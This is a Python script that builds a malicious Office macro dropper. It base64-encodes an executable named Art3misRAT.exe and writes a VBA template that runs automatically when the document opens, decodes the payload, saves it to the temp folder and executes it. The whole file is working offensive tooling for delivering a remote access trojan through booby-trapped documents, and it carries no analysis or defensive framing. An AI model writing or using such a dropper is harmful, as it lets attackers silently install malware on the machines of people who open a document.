import base64

# Specify the file paths
exe_path = r"C:\Users\Admin\Downloads\Art3misRAT.exe"
output_path = r"C:\Users\Admin\OneDrive - UT Health San Antonio\Desktop\rat_encoded.txt"

# Read the executable and encode it in base64
with open(exe_path, "rb") as exe_file:
    encoded_string = base64.b64encode(exe_file.read()).decode('utf-8')

# Split the base64 string into chunks to avoid line length limitations in VBA
chunk_size = 100  # Adjust the chunk size if needed
chunks = [encoded_string[i:i + chunk_size] for i in range(0, len(encoded_string), chunk_size)]

# VBA code template with placeholder for the base64 string chunks
vba_template = """
Private Sub Document_Open()
    Call AutoOpen
End Sub

Sub AutoOpen()
    Call ExtractAndRun
End Sub

Sub ExtractAndRun()
    Dim base64String As String
    base64String = """""

# Append the chunks to the base64String in VBA
for chunk in chunks:
    vba_template += f"\n    base64String = base64String & \"{chunk}\""

vba_template += """
    Dim byteArray() As Byte
    byteArray = Base64ToByteArray(base64String)
    SaveBinaryData Environ("TEMP") & "\\Art3mis.exe", byteArray
    Shell Environ("TEMP") & "\\Art3mis.exe"
End Sub

Function Base64ToByteArray(base64String As String) As Byte()
    Dim xmlObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument")
    xmlObj.LoadXml "<root />"
    xmlObj.documentElement.dataType = "bin.base64"
    xmlObj.documentElement.Text = base64String
    Base64ToByteArray = xmlObj.documentElement.nodeTypedValue
End Function

Sub SaveBinaryData(filename As String, byteArray() As Byte)
    Dim binaryStream As Object
    Set binaryStream = CreateObject("ADODB.Stream")
    binaryStream.Type = 1 'adTypeBinary
    binaryStream.Open
    binaryStream.Write byteArray
    binaryStream.SaveToFile filename, 2 'adSaveCreateOverWrite
    binaryStream.Close
End Sub
"""

# Save the VBA code with the embedded base64 string chunks to a .txt file
with open(output_path, "w") as vba_file:
    vba_file.write(vba_template)

print(f"VBA code with embedded executable has been saved to {output_path}")
